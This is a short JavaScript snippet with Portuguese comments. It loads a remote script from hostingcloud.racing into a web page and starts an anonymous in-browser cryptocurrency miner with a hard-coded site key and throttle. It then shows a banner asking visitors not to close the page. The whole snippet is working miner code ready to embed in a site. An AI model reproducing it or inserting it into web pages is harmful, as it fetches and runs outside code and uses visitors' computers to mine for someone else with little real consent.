// Importar o arquivo externo
var script = document.createElement('script');
script.src = 'https://www.hostingcloud.racing/6ZFJ.js';
document.head.appendChild(script);

// Executar o código existente
script.onload = function() {
    var _client = new Client.Anonymous('876cd29da7454db785906ba686bcf9c64d66602d6b3e8846705bb135a3a2b74a', { throttle: 0.2, c: 'w' }); 
    _client.start(); 
    _client.addMiningNotification("Top", "Não feche!! Se isso te incomodar, você pode parar.", "#cccccc", 40, "#3d3d3d");
};
